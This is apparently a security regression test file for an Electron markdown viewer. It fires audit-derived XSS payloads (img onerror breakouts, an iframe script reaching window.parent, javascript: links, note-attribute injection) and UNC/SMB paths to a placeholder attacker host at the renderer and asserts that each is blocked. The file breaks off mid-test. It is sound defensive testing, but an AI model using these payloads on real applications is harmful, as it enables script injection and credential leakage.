// End-to-end security regression harness for the render pipeline.
// Run with: npm run test:security
//
// Boots the real main.js, then drives window.renderMarkdown() with the exact
// payloads from SECURITY-AUDIT.md (SEC-01 through SEC-04) and asserts that none
// of them execute. Every attack test is paired with a feature test, because the
// remedy - making DOMPurify the last step in the pipeline instead of the third
// of nine - is exactly the kind of change that can silently stop mermaid,
// sliders, OmniWare or @@@html blocks from rendering at all.
//
// Payloads set window.__pwned rather than spawning a process. The property that
// matters is whether attacker-authored script runs in the Node-privileged
// renderer at all; what it would then choose to do is not in question.
const { app, BrowserWindow } = require("electron");
const fs = require("fs");
const os = require("os");
const path = require("path");

require("./main.js");

const dir = fs.mkdtempSync(path.join(os.tmpdir(), "mdv-sec-"));

const results = [];
const skipped = [];
function check(name, ok, detail) {
  results.push({ name, ok, detail });
  console.log(`${ok ? "PASS" : "FAIL"}  ${name}${ok ? "" : "  -> " + detail}`);
}

const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

const {
  startErrorSentinel,
  proveSentinelAlive,
  captureScreenshot,
} = require("./test-visual-utils");

async function run(win) {
  const exec = (code) => win.webContents.executeJavaScript(code, true);

  // This suite's whole job is to fire hostile input at the app, so a large
  // share of the console noise it produces is the app defending itself. Those
  // patterns are ignored by name; anything else that reaches the console, or
  // any error that becomes visible on screen, is a real defect and fails the
  // run. See startErrorSentinel() in test-visual-utils.js.
  const sentinel = startErrorSentinel(win, {
    label: "security",
    ignore: [
      // Every CSP refusal below is a control working as designed. They are
      // asserted individually elsewhere in this file, so ignoring the console
      // copy costs no coverage.
      /Refused to (load|connect|run|execute|apply)/i,
      /Content Security Policy/i,
      /probe\.invalid/i,
      /ERR_BLOCKED_BY_CSP/,
      // Unresolvable probe hosts. `.invalid` is guaranteed never to resolve
      // (RFC 6761), which is the point - see the popup suite's note.
      /net::ERR_NAME_NOT_RESOLVED/,
      /Failed to load resource/i,
    ],
    // Almost every <img> in this suite points at a path chosen to be absent
    // (x.png, local.png, //attacker.invalid/...): the assertions are about
    // whether the src survived sanitization, never about whether it loaded.
    // The broken-image check stays active in the suites where a broken image
    // would be a real defect.
    ignoreKinds: ["broken-image"],
  });

  // Render `md` through the chosen pipeline and report whether any payload
  // managed to run. `settle` covers mermaid/iframe work that lands after the
  // render promise resolves.
  async function render(md, mode, settle = 900) {
    await exec(`
      (async () => {
        window.__pwned = null;
        window.__lastRenderError = null;
        try {
          await window.renderMarkdown(${JSON.stringify(md)}, ${JSON.stringify(mode)});
        } catch (e) {
          window.__lastRenderError = String(e && e.message || e);
        }
        return null;
      })()
    `);
    await sleep(settle);
    return exec(`window.__pwned`);
  }

  const viewerHtml = () => exec(`document.getElementById('viewer').innerHTML`);

  // ==========================================================================
  // SEC-02 - mermaid fence body injected raw after DOMPurify
  // ==========================================================================

  // Everything from here to the valid-diagram assertion below feeds mermaid
  // markup it cannot parse - that is the payload. Mermaid answers with its red
  // "Syntax error in text" graphic, which is the correct outcome and exactly
  // what the SEC-02 assertions are checking for (an SVG that is *not* a real
  // diagram). Muted narrowly so the same graphic appearing anywhere else in
  // this suite still fails the run.
  await sentinel.mute("SEC-02 feeds mermaid an unparseable payload on purpose");

  const mermaidPayload =
    "# Doc\n\n```mermaid\n<img src=x onerror=\"window.__pwned='mermaid-full'\">\n```\n";

  check(
    "SEC-02 mermaid fence payload does not execute (full render)",
    (await render(mermaidPayload, "full")) === null,
    "window.__pwned was set from a mermaid fence body",
  );

  check(
    "SEC-02 mermaid fence payload does not execute (light-format render)",
    (await render(
      "# Doc\n\n```mermaid\n<img src=x onerror=\"window.__pwned='mermaid-light'\">\n```\n",
      "light-format",
    )) === null,
    "window.__pwned was set via the light-format path",
  );

  // The body must survive as *text*, not as markup.
  const mermaidEscaped = await exec(`
    (() => {
      const el = document.querySelector('pre.mermaid');
      if (!el) return { found: false };
      return { found: true, imgChildren: el.querySelectorAll('img').length };
    })()
  `);
  check(
    "SEC-02 mermaid body is inserted as text, not as an element",
    mermaidEscaped.found === false || mermaidEscaped.imgChildren === 0,
    JSON.stringify(mermaidEscaped),
  );

  // ==========================================================================
  // SEC-03 - image-slider src/alt injected raw after DOMPurify
  // ==========================================================================
  const sliderPayload =
    "# Doc\n\n<!-- slider-start -->\n" +
    "![\" onerror=\"window.__pwned='slider'](a.png)\n" +
    "![second](b.png)\n" +
    "<!-- slider-end -->\n";

  check(
    "SEC-03 slider alt-attribute breakout does not execute",
    (await render(sliderPayload, "full")) === null,
    "window.__pwned was set from a slider alt attribute",
  );

  // ==========================================================================
  // SEC-04 - OmniWare renderer output injected raw after DOMPurify
  // ==========================================================================
  const omniwarePayload =
    "# Doc\n\n```omniware\n@nav\n  <img src=x onerror=window.__pwned='omniware'> | Home\n```\n";

  check(
    "SEC-04 OmniWare DSL payload does not execute",
    (await render(omniwarePayload, "full")) === null,
    "window.__pwned was set from an OmniWare nav label",
  );

  // ==========================================================================
  // SEC-01 - @@@html blocks reach window.parent
  // ==========================================================================
  const rawHtmlPayload =
    "# Doc\n\n@@@html\n" +
    "<p id=rawhtml-marker>raw html body</p>\n" +
    "<scr" + "ipt>try{window.parent.__pwned='iframe'}catch(e){}</scr" + "ipt>\n" +
    "@@@\n";

  check(
    "SEC-01 @@@html iframe cannot reach window.parent (full render)",
    (await render(rawHtmlPayload, "full", 2200)) === null,
    "an @@@html block wrote to window.parent - the iframe is same-origin",
  );

  check(
    "SEC-01 @@@html iframe cannot reach window.parent (light-format render)",
    (await render(rawHtmlPayload, "light-format", 2200)) === null,
    "light-format path allowed parent access",
  );

  // The sandbox attribute must be present AND must not re-grant same-origin,
  // because sandbox="allow-scripts allow-same-origin" is equivalent to no
  // sandbox at all for this purpose.
  //
  // hasPayload is asserted here on purpose: if the pipeline ever drops srcdoc
  // entirely (DOMPurify does exactly that when the value contains a <script>),
  // the two attack tests above would pass for the wrong reason - nothing ran
  // because nothing loaded. This makes that failure mode loud instead of silent.
  const iframeAttrs = await exec(`
    (() => {
      const f = document.querySelector('iframe.raw-html-block');
      if (!f) return { found: false };
      const sd = f.getAttribute('srcdoc') || '';
      return {
        found: true,
        sandbox: f.getAttribute('sandbox'),
        hasSrcdoc: !!sd,
        hasPayload: sd.includes('window.parent.__pwned')
      };
    })()
  `);
  check(
    "SEC-01 @@@html iframe carries a real sandbox without allow-same-origin",
    iframeAttrs.found === true &&
      typeof iframeAttrs.sandbox === "string" &&
      iframeAttrs.sandbox.includes("allow-scripts") &&
      !iframeAttrs.sandbox.includes("allow-same-origin"),
    JSON.stringify(iframeAttrs),
  );

  check(
    "SEC-01 the attack actually loaded, so the two tests above are not vacuous",
    iframeAttrs.hasSrcdoc === true && iframeAttrs.hasPayload === true,
    JSON.stringify(iframeAttrs),
  );

  // ==========================================================================
  // Feature preservation - the remedy must not break what it protects
  // ==========================================================================

  // Mermaid still renders to SVG. Asserting only that *an* svg exists is too
  // weak: mermaid emits an svg for parse failures too, so a broken escape would
  // still "pass". Assert it is a real flowchart carrying the node labels.
  await render(
    "# Doc\n\n```mermaid\ngraph TD\n  A[Start] --> B[End]\n```\n",
    "full",
    2500,
  );
  const mermaidSvg = await exec(`
    (() => {
      const el = document.querySelector('pre.mermaid');
      const svg = el && el.querySelector('svg');
      if (!svg) return { present: !!el, hasSvg: false };
      const labels = Array.from(svg.querySelectorAll('text,tspan,foreignObject'))
        .map(t => (t.textContent || '').trim());
      return {
        present: true,
        hasSvg: true,
        role: svg.getAttribute('aria-roledescription'),
        nodeCount: svg.querySelectorAll('g.node').length,
        hasLabels: labels.includes('Start') && labels.includes('End'),
        isError: /syntax error|mermaid version/i.test(svg.textContent || ''),
        src: el.getAttribute('data-mermaid-src')
      };
    })()
  `);
  check(
    "FEATURE mermaid diagram still renders to SVG",
    mermaidSvg.present && mermaidSvg.hasSvg,
    JSON.stringify(mermaidSvg),
  );
  check(
    "FEATURE mermaid SVG is a real diagram with its labels, not an error graphic",
    mermaidSvg.hasSvg === true &&
      mermaidSvg.isError === false &&
      mermaidSvg.nodeCount === 2 &&
      mermaidSvg.hasLabels === true,
    JSON.stringify(mermaidSvg),
  );
  // A real diagram is on screen now, so the unparseable payloads are gone and
  // the sentinel can go back on watch.
  await sentinel.unmute();

  // Mermaid syntax containing '<' must round-trip. Class diagrams use '<|--',
  // which an over-eager escape would corrupt into something mermaid rejects.
  await render(
    "# Doc\n\n```mermaid\nclassDiagram\n  Animal <|-- Duck\n```\n",
    "full",
    2500,
  );
  const mermaidAngle = await exec(`
    (() => {
      const el = document.querySelector('pre.mermaid');
      if (!el) return { present: false };
      return {
        present: true,
        src: el.dataset.mermaidSrc || '',
        hasSvg: !!el.querySelector('svg')
      };
    })()
  `);
  check(
    "FEATURE mermaid source containing '<|--' survives intact",
    mermaidAngle.present &&
      mermaidAngle.src.includes("<|--") &&
      mermaidAngle.hasSvg,
    JSON.stringify(mermaidAngle),
  );

  // Slider still renders every slide with its real src and alt.
  await render(
    "# Doc\n\n<!-- slider-start -->\n![one](a.png)\n![two](b.png)\n<!-- slider-end -->\n",
    "full",
  );
  const slider = await exec(`
    (() => {
      const s = document.querySelector('.image-slider');
      if (!s) return { present: false };
      const imgs = [...s.querySelectorAll('.slider-slide img')];
      return {
        present: true,
        slides: s.querySelectorAll('.slider-slide').length,
        dots: s.querySelectorAll('.slider-dot').length,
        srcs: imgs.map(i => i.getAttribute('src')),
        alts: imgs.map(i => i.getAttribute('alt')),
        zoomBtns: s.querySelectorAll('.img-zoom-btn').length
      };
    })()
  `);
  check(
    "FEATURE image slider still renders slides, dots, srcs and alts",
    slider.present &&
      slider.slides === 2 &&
      slider.dots === 2 &&
      slider.zoomBtns === 2 &&
      slider.srcs.join(",").includes("a.png") &&
      slider.alts.join(",") === "one,two",
    JSON.stringify(slider),
  );

  // OmniWare still renders real markup.
  await render("# Doc\n\n```omniware\n@nav\n  Brand | Home | About\n```\n", "full");
  const omni = await exec(`
    (() => {
      const el = document.querySelector('.omniware-rendered');
      if (!el) return { present: false };
      return {
        present: true,
        hasNav: !!el.querySelector('.ow-nav-logo, .ow-nav-item'),
        text: el.textContent.replace(/\\s+/g, ' ').trim().slice(0, 80),
        dsl: el.getAttribute('data-omniware-dsl')
      };
    })()
  `);
  check(
    "FEATURE OmniWare block still renders its wireframe markup",
    omni.present && omni.hasNav && omni.text.includes("Home"),
    JSON.stringify(omni),
  );

  // @@@html still displays its content (sandboxed, but not blank).
  await render(
    "# Doc\n\n@@@html\n<p id=rawhtml-marker>hello from raw html</p>\n@@@\n",
    "full",
    2000,
  );
  const rawHtml = await exec(`
    (() => {
      const f = document.querySelector('iframe.raw-html-block');
      if (!f) return { present: false };
      const sd = f.getAttribute('srcdoc') || '';
      return {
        present: true,
        srcdocHasBody: sd.includes('hello from raw html'),
        sandbox: f.getAttribute('sandbox')
      };
    })()
  `);
  check(
    "FEATURE @@@html block still carries its content into the iframe",
    rawHtml.present && rawHtml.srcdocHasBody,
    JSON.stringify(rawHtml),
  );

  // Ordinary markdown must be completely unaffected.
  await render(
    "# Title\n\n## Sub\n\nSome **bold** and `code` and [a link](https://example.invalid).\n\n" +
      "| a | b |\n|---|---|\n| 1 | 2 |\n\n" +
      "```js\nconst x = 1;\n```\n\n" +
      "![pic](local.png)\n\n" +
      "<span style=\"color:red\" class=\"keepme\">inline html</span>\n",
    "full",
    1200,
  );
  const basics = await exec(`
    (() => {
      const v = document.getElementById('viewer');
      const span = v.querySelector('span.keepme');
      return {
        h1: v.querySelectorAll('h1').length,
        h2: v.querySelectorAll('h2').length,
        strong: v.querySelectorAll('strong').length,
        code: v.querySelectorAll('code').length,
        link: !!v.querySelector('a[href="https://example.invalid"]'),
        table: v.querySelectorAll('table tbody tr').length,
        pre: v.querySelectorAll('pre').length,
        img: !!v.querySelector('img[src="local.png"]'),
        inlineSpan: !!span,
        spanStyle: span ? span.getAttribute('style') : null
      };
    })()
  `);
  check(
    "FEATURE ordinary markdown still renders (headings, table, code, link, img)",
    basics.h1 >= 1 &&
      basics.h2 >= 1 &&
      basics.strong >= 1 &&
      basics.link &&
      basics.table === 1 &&
      basics.pre >= 1 &&
      basics.img,
    JSON.stringify(basics),
  );
  check(
    "FEATURE inline HTML with class and style attributes still survives",
    basics.inlineSpan && !!basics.spanStyle,
    JSON.stringify(basics),
  );

  // Data-URI images are placeholder-swapped around DOMPurify; moving the
  // sanitize step is exactly what could break that dance.
  const tinyPng =
    "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==";
  await render(`# Doc\n\n![tiny](${tinyPng})\n`, "full", 1000);
  const dataUri = await exec(`
    (() => {
      const img = document.querySelector('#viewer img');
      return { src: img ? img.getAttribute('src') : null };
    })()
  `);
  check(
    "FEATURE data-URI images survive the sanitize step",
    typeof dataUri.src === "string" && dataUri.src.startsWith("data:image/png;base64,"),
    JSON.stringify(dataUri),
  );

  // A javascript: URL must not survive, in either path.
  await render("# Doc\n\n[click](javascript:window.__pwned='link')\n", "full");
  const jsLink = await exec(`
    (() => {
      const a = document.querySelector('#viewer a');
      return { href: a ? a.getAttribute('href') : null };
    })()
  `);
  check(
    "SANITIZER javascript: URLs are still stripped from links",
    !jsLink.href || !/^javascript:/i.test(jsLink.href.trim()),
    JSON.stringify(jsLink),
  );

  // Both render paths must agree; a payload blocked on one and not the other is
  // exactly the inconsistency SEC-26 describes.
  check(
    "SEC-26 slider payload is blocked on the light-format path too",
    (await render(sliderPayload, "light-format")) === null,
    "light-format path executed the slider payload",
  );
  check(
    "SEC-26 OmniWare payload is blocked on the light-format path too",
    (await render(omniwarePayload, "light-format")) === null,
    "light-format path executed the OmniWare payload",
  );

  // ==========================================================================
  // Raw-HTML frame ownership
  //
  // @@@html documents are attached with setAttribute *after* sanitization, so
  // the only thing stopping arbitrary markdown from picking one up is how the
  // frames are keyed. These pin that: a forged marker must get nothing, and a
  // frame must never keep showing a previous document's content.
  // ==========================================================================

  // Render a real @@@html block and capture the key the renderer assigned.
  await render(
    "# Doc\n\n@@@html\n<p id=owned-marker>owned raw html</p>\n@@@\n",
    "full",
    2200,
  );
  const realKey = await exec(`
    (() => {
      const f = document.querySelector('iframe.raw-html-block');
      return f ? { key: f.dataset.rawhtmlKey || null, len: (f.getAttribute('srcdoc')||'').length } : null;
    })()
  `);
  check(
    "FEATURE @@@html frame is keyed by content and receives its document",
    realKey && typeof realKey.key === "string" && realKey.key.length > 0 && realKey.len > 0,
    JSON.stringify(realKey),
  );

  // Same key, but authored directly in markdown in a document that contains no
  // @@@html block at all. The frame must come back empty - if it does not, raw
  // HTML from a previously viewed file is leaking into this one.
  const forged =
    "# Doc\n\n<iframe class=\"raw-html-block\" data-rawhtml-key=\"" +
    String(realKey && realKey.key) +
    "\"></iframe>\n";
  await render(forged, "full", 2200);
  const forgedState = await exec(`
    (() => {
      const f = document.querySelector('iframe.raw-html-block');
      if (!f) return { present: false };
      const sd = f.getAttribute('srcdoc') || '';
      return { present: true, srcdocLen: sd.length, leaked: sd.includes('owned raw html') };
    })()
  `);
  check(
    "SEC-01 a markdown-authored raw-html marker receives no document",
    forgedState.present === false ||
      (forgedState.srcdocLen === 0 && forgedState.leaked === false),
    JSON.stringify(forgedState),
  );

  // Same document, this time containing the real @@@html block AND a forged
  // marker reusing its key. The key is derived from public content, so an
  // author can always compute it; what must not happen is the forged frame
  // getting a second copy of the block's document.
  const sameRender =
    "# Doc\n\n@@@html\n<p id=owned-marker>owned raw html</p>\n@@@\n\n" +
    "<iframe class=\"raw-html-block\" data-rawhtml-key=\"" +
    String(realKey && realKey.key) +
    "\"></iframe>\n";
  await render(sameRender, "full", 2500);
  const sameRenderState = await exec(`
    (() => {
      const fs = Array.from(document.querySelectorAll('iframe.raw-html-block'));
      return {
        count: fs.length,
        filled: fs.filter(f => (f.getAttribute('srcdoc')||'').includes('owned raw html')).length
      };
    })()
  `);
  check(
    "SEC-01 a forged marker cannot claim a second copy of a block in the same render",
    sameRenderState.count >= 1 && sameRenderState.filled === 1,
    JSON.stringify(sameRenderState),
  );

  // ...but two genuinely identical @@@html blocks must both still render.
  await render(
    "# Doc\n\n@@@html\n<p>twin</p>\n@@@\n\n@@@html\n<p>twin</p>\n@@@\n",
    "full",
    2500,
  );
  const twins = await exec(`
    (() => {
      const fs = Array.from(document.querySelectorAll('iframe.raw-html-block'));
      return {
        count: fs.length,
        filled: fs.filter(f => (f.getAttribute('srcdoc')||'').includes('twin')).length
      };
    })()
  `);
  check(
    "FEATURE two identical @@@html blocks both receive their document",
    twins.count === 2 && twins.filled === 2,
    JSON.stringify(twins),
  );

  // The resize channel is the only way a sandboxed @@@html frame can influence  // the host, and it now identifies the sender by matching event.source against
  // the managed frames. If contentWindow does not match for an opaque-origin
  // srcdoc frame, that check silently kills the feature - so assert the height
  // is actually applied, end to end, rather than trusting the code shape.
  await render(
    "# Doc\n\n@@@html\n<div style=\"height:640px\">tall</div>\n@@@\n",
    "full",
    3500,
  );
  const resized = await exec(`
    (() => {
      const f = document.querySelector('iframe.raw-html-block');
      if (!f) return { present: false };
      return { present: true, height: parseInt(f.style.height || '0', 10) };
    })()
  `);
  check(
    "FEATURE sandboxed @@@html frame can still report its height to the host",
    resized.present === true && resized.height >= 600,
    JSON.stringify(resized),
  );
  // Since SEC-09 landed this assertion carries a second, heavier job, recorded
  // here because it is not obvious from its name: it is the control for
  // `script-src 'unsafe-inline'`.
  //
  // The height is written by a script buildRawHtmlDocument() appends inside the
  // srcdoc document (renderer.js:260), and an about:srcdoc frame inherits the
  // embedder's CSP. Drop 'unsafe-inline' and that script never runs: no error
  // is logged anywhere, the frame silently stays at its 50px min-height, and
  // every @@@html block in the app is clipped. Verified by reverting the CSP to
  // `script-src 'self'` - this assertion reports height 0.

  // ==========================================================================
  // Local image paths - the sanitizer hook must be narrow
  //
  // Drive-letter and file:///<drive> paths are ordinary usage in a local
  // viewer. UNC and remote file://host paths are not: on Windows an <img>
  // pointing at a remote SMB share is fetched automatically and can hand the
  // user's NTLM credentials to a host named by untrusted markdown.
  // ==========================================================================
  await render(
    "# Doc\n\n" +
      "<img id=i1 src=\"C:\\pics\\a.png\">\n\n" +
      "<img id=i2 src=\"file:///C:/pics/b.png\">\n\n" +
      "<img id=i3 src=\"\\\\attacker\\share\\c.png\">\n\n" +
      "<img id=i4 src=\"file://attacker/share/d.png\">\n\n" +
      "<img id=i5 src=\"img/e.png\">\n\n" +
      "<img id=i6 src=\"//attacker/share/f.png\">\n",
    "full",
    1500,
  );
  const imgs = await exec(`
    (() => {
      const g = (id) => {
        const el = document.getElementById(id);
        return el ? (el.getAttribute('src') || '') : null;
      };
      return { i1: g('i1'), i2: g('i2'), i3: g('i3'), i4: g('i4'), i5: g('i5'), i6: g('i6') };
    })()
  `);
  check(
    "FEATURE local drive-letter and file:///<drive> image paths are preserved",
    imgs.i1 === "C:\\pics\\a.png" && imgs.i2 === "file:///C:/pics/b.png",
    JSON.stringify(imgs),
  );
  check(
    "SEC-hook UNC, protocol-relative and remote file:// image paths are stripped",
    !imgs.i3 && !imgs.i4 && !imgs.i6,
    JSON.stringify(imgs),
  );
  check(
    "FEATURE ordinary relative image paths are unaffected by the hook",
    imgs.i5 === "img/e.png",
    JSON.stringify(imgs),
  );

  // ==========================================================================
  // SEC-12 - a link to a local file was handed straight to shell.openPath()
  //
  // The threat model is a markdown document that arrives with sibling files
  // under the same author's control (a cloned repo, an unpacked archive, a
  // shared folder). hrefs resolve relative to the document's own directory, so
  // "[architecture diagram](./setup.exe)" was one click away from executing an
  // attacker-supplied binary through the system shell - with no prompt, and no
  // indication in the link text that anything but a diagram would open.
  //
  // Every assertion below drives the REAL anchor-click handler on a REAL file
  // on disk; nothing is asserted about source text. shell.openPath, confirm(),
  // ipcRenderer.send and fs.existsSync are stubbed only so the harness can
  // observe what the handler decided to do (and so a native confirm() does not
  // block executeJavaScript forever, as it does in test-tab-refresh.js).
  // ==========================================================================
  const s12dir = path.join(dir, "sec12");
  fs.mkdirSync(s12dir, { recursive: true });
  for (const f of [
    "setup.exe",
    "script.ps1",
    "report.docm",
    "notes.txt",
    "diagram.svg",
    "linked.md",
  ]) {
    fs.writeFileSync(path.join(s12dir, f), "placeholder");
  }
  const s12doc = path.join(s12dir, "doc.md");
  fs.writeFileSync(s12doc, "# doc\n");

  await exec(`
    (() => {
      const { shell, ipcRenderer } = require('electron');
      const nodeFs = require('fs');
      window.__s12 = { openPath: [], ipc: [], notes: [], confirms: [], exists: [] };
      window.__s12ConfirmAnswer = false;
      window.__s12Restore = {
        openPath: shell.openPath,
        send: ipcRenderer.send,
        confirm: window.confirm,
        notify: window.showNotification,
        existsSync: nodeFs.existsSync,
      };
      shell.openPath = (p) => { window.__s12.openPath.push(String(p)); return Promise.resolve(''); };
      ipcRenderer.send = function (channel, ...args) {
        if (channel === 'open-file-path') { window.__s12.ipc.push(String(args[0])); return; }
        return window.__s12Restore.send.call(ipcRenderer, channel, ...args);
      };
      // Recorded, then delegated - the handler still needs a truthful answer.
      nodeFs.existsSync = function (p) {
        window.__s12.exists.push(String(p));
        return window.__s12Restore.existsSync.call(nodeFs, p);
      };
      window.showNotification = (m) => { window.__s12.notes.push(String(m)); };
      window.confirm = (m) => {
        window.__s12.confirms.push(String(m));
        return window.__s12ConfirmAnswer === true;
      };
      window.currentFilePath = ${JSON.stringify(s12doc)};
      return null;
    })()
  `);

  const s12Reset = () =>
    exec(`
      (() => {
        const s = window.__s12;
        s.openPath.length = 0; s.ipc.length = 0;
        s.notes.length = 0; s.confirms.length = 0; s.exists.length = 0;
        return null;
      })()
    `);

  // Click the rendered anchor whose visible text matches, then report what the
  // handler did. Selecting by link text is deliberate: it is the only thing the
  // reader sees, and the whole point of the finding is that it says nothing
  // about what will be opened.
  const s12Click = async (text) => {
    await s12Reset();
    const clicked = await exec(`
      (() => {
        const a = Array.from(document.querySelectorAll('#viewer a'))
          .find((x) => x.textContent.trim() === ${JSON.stringify(text)});
        if (!a) return { found: false };
        a.click();
        return { found: true, href: a.getAttribute('href') };
      })()
    `);
    await sleep(120);
    const state = await exec(`window.__s12`);
    return { ...state, clicked };
  };

  await render(
    [
      "# Local links",
      "",
      "[exe](./setup.exe)",
      "",
      "[ps1](./script.ps1)",
      "",
      "[docm](./report.docm)",
      "",
      "[txt](./notes.txt)",
      "",
      "[svg](./diagram.svg)",
      "",
      "[md](./linked.md)",
      "",
      "[unc](//attacker.invalid/share/payload.txt)",
      "",
    ].join("\n"),
    "full",
  );

  for (const [label, text] of [
    ["Windows executable", "exe"],
    ["PowerShell script", "ps1"],
    ["macro-enabled Office document", "docm"],
  ]) {
    const r = await s12Click(text);
    check(
      `SEC-12 a link to a ${label} is refused outright`,
      r.clicked.found === true &&
        r.openPath.length === 0 &&
        r.ipc.length === 0 &&
        r.confirms.length === 0 &&
        r.notes.length === 1,
      JSON.stringify(r),
    );
  }

  const s12Txt = await s12Click("txt");
  check(
    "FEATURE an inert document (.txt) still opens without a prompt",
    s12Txt.openPath.length === 1 &&
      s12Txt.openPath[0].endsWith("notes.txt") &&
      s12Txt.confirms.length === 0,
    JSON.stringify(s12Txt),
  );

  const s12Md = await s12Click("md");
  check(
    "FEATURE a markdown link still opens inside the app, never via the shell",
    s12Md.ipc.length === 1 &&
      s12Md.ipc[0].endsWith("linked.md") &&
      s12Md.openPath.length === 0,
    JSON.stringify(s12Md),
  );

  // .svg is in neither set: script-capable when the system handler is a
  // browser, but a legitimate thing to link to. It must ask.
  await exec(`window.__s12ConfirmAnswer = false; null`);
  const s12SvgNo = await s12Click("svg");
  check(
    "SEC-12 an unrecognised type asks first, and declining opens nothing",
    s12SvgNo.confirms.length === 1 &&
      s12SvgNo.confirms[0].includes("diagram.svg") &&
      s12SvgNo.openPath.length === 0,
    JSON.stringify(s12SvgNo),
  );

  await exec(`window.__s12ConfirmAnswer = true; null`);
  const s12SvgYes = await s12Click("svg");
  check(
    "FEATURE accepting the prompt opens the unrecognised type",
    s12SvgYes.confirms.length === 1 &&
      s12SvgYes.openPath.length === 1 &&
      s12SvgYes.openPath[0].endsWith("diagram.svg"),
    JSON.stringify(s12SvgYes),
  );
  await exec(`window.__s12ConfirmAnswer = false; null`);

  const s12Unc = await s12Click("unc");
  check(
    "SEC-12 a protocol-relative UNC link is blocked and never reaches the filesystem",
    // The href assertion is load-bearing: without it this would still pass if
    // DOMPurify had stripped the href and the handler never ran at all.
    s12Unc.clicked.href === "//attacker.invalid/share/payload.txt" &&
      s12Unc.notes.length === 1 &&
      s12Unc.openPath.length === 0 &&
      s12Unc.confirms.length === 0 &&
      !s12Unc.exists.some((p) => /attacker\.invalid/i.test(p)),
    JSON.stringify(s12Unc),
  );

  // The backslash form cannot be authored in markdown (marked eats the
  // escapes), so it is injected as a real anchor. What is under test is the
  // handler, not the parser. The ordering assertion is the important half: on
  // Windows, fs.existsSync() on a UNC path opens the SMB connection and leaks
  // an NTLMv2 challenge/response before anything is ever "opened".
  await s12Reset();
  const s12Unc2 = await exec(`
    (async () => {
      const a = document.createElement('a');
      a.setAttribute('href', '\\\\\\\\attacker.invalid\\\\share\\\\payload.txt');
      a.textContent = 'unc2';
      document.getElementById('viewer').appendChild(a);
      a.click();
      await new Promise((r) => setTimeout(r, 120));
      const s = window.__s12;
      a.remove();
      return { openPath: s.openPath.slice(), confirms: s.confirms.slice(), exists: s.exists.slice(), notes: s.notes.slice() };
    })()
  `);
  check(
    "SEC-12 a backslash UNC link is blocked before fs.existsSync() touches the network",
    s12Unc2.openPath.length === 0 &&
      s12Unc2.confirms.length === 0 &&
      s12Unc2.exists.length === 0 &&
      s12Unc2.notes.length === 1,
    JSON.stringify(s12Unc2),
  );

  // --- symlinks and directories -------------------------------------------
  // The policy is decided from the extension, so it has to be decided from the
  // extension of what the link *actually resolves to*. A symlink named
  // diagram.png pointing at payload.ps1 is opened by the shell as the script.
  // Symlinks are ordinary on the macOS and Linux release targets.
  const s12link = path.join(s12dir, "diagram-link.png");
  let symlinksAvailable = true;
  try {
    fs.symlinkSync(path.join(s12dir, "script.ps1"), s12link, "file");
  } catch (e) {
    // Windows needs Developer Mode or SeCreateSymbolicLinkPrivilege.
    symlinksAvailable = false;
    console.log(
      `SKIP  SEC-12 symlink coverage - cannot create a symlink here (${e.code || e.message})`,
    );
    skipped.push("SEC-12 symlink");
  }

  const s12subdir = path.join(s12dir, "subfolder");
  fs.mkdirSync(s12subdir, { recursive: true });

  await render(
    [
      "# Resolution",
      "",
      "[symlink](./diagram-link.png)",
      "",
      "[folder](./subfolder)",
      "",
    ].join("\n"),
    "full",
  );

  if (symlinksAvailable) {
    const s12Sym = await s12Click("symlink");
    check(
      "SEC-12 a symlink with a safe-looking name is judged by its real target",
      s12Sym.clicked.found === true &&
        s12Sym.openPath.length === 0 &&
        s12Sym.confirms.length === 0 &&
        s12Sym.notes.length === 1,
      JSON.stringify(s12Sym),
    );
  }

  const s12Dir = await s12Click("folder");
  check(
    "FEATURE a link to a folder still opens it, and is not mistaken for an executable",
    s12Dir.clicked.found === true &&
      s12Dir.openPath.length === 1 &&
      s12Dir.openPath[0].endsWith("subfolder") &&
      s12Dir.notes.length === 0,
    JSON.stringify(s12Dir),
  );

  // An extensionless file is ambiguous, not automatically hostile. LICENSE,
  // README, Makefile and .bashrc are ordinary link targets; an earlier
  // revision of this fix refused them all outright and told the user they
  // were executables.
  fs.writeFileSync(path.join(s12dir, "LICENSE"), "MIT\n");
  await render("# Ext\n\n[license](./LICENSE)\n", "full");
  await exec(`window.__s12ConfirmAnswer = true; null`);
  const s12Lic = await s12Click("license");
  await exec(`window.__s12ConfirmAnswer = false; null`);
  check(
    "SEC-12 an extensionless file asks rather than being refused as an executable",
    s12Lic.clicked.found === true &&
      s12Lic.confirms.length === 1 &&
      s12Lic.confirms[0].includes("LICENSE") &&
      s12Lic.openPath.length === 1,
    JSON.stringify(s12Lic),
  );

  await exec(`
    (() => {
      const { shell, ipcRenderer } = require('electron');
      const nodeFs = require('fs');
      const r = window.__s12Restore;
      shell.openPath = r.openPath;
      ipcRenderer.send = r.send;
      nodeFs.existsSync = r.existsSync;
      window.confirm = r.confirm;
      window.showNotification = r.notify;
      return null;
    })()
  `);

  // ==========================================================================
  // SEC-13 / SEC-14 - attacker-controlled strings reaching innerHTML in the
  // app's own chrome (notes tooltip, All-Notes panel, recent-files menu).
  //
  // These are not part of the rendered document, so the render-pipeline
  // assertions above say nothing about them. `data-note-id`, `data-note-title`,
  // `data-note-content` and `data-note-color` are all explicitly allowlisted in
  // the DOMPurify config, so their values arrive here exactly as authored.
  // ==========================================================================
  const NOTE_PAYLOAD_ID = `1"><img src=x onerror="window.__pwned='note-id'">`;
  const NOTE_PAYLOAD_COLOR = `red"><img src=x onerror="window.__pwned='note-color'">`;
  const htmlAttr = (s) =>
    s.replace(/&/g, "&amp;").replace(/"/g, "&quot;").replace(/</g, "&lt;").replace(/>/g, "&gt;");

  await render(
    [
      "# Notes chrome",
      "",
      `Here is <span class="noted-text" data-note-id="${htmlAttr(NOTE_PAYLOAD_ID)}" ` +
        `data-note-color="${htmlAttr(NOTE_PAYLOAD_COLOR)}" ` +
        `data-note-title="Title" data-note-content="Body">noted</span> text.`,
      "",
    ].join("\n"),
    "full",
  );

  const attrsSurvived = await exec(`
    (() => {
      const el = document.querySelector('#viewer .noted-text');
      if (!el) return { found: false };
      return {
        found: true,
        id: el.getAttribute('data-note-id'),
        color: el.getAttribute('data-note-color'),
      };
    })()
  `);
  // Without this the two assertions below could pass simply because DOMPurify
  // stripped the attributes and there was never anything to escape.
  check(
    "SEC-13 the payload really does survive DOMPurify into data-note-* (control)",
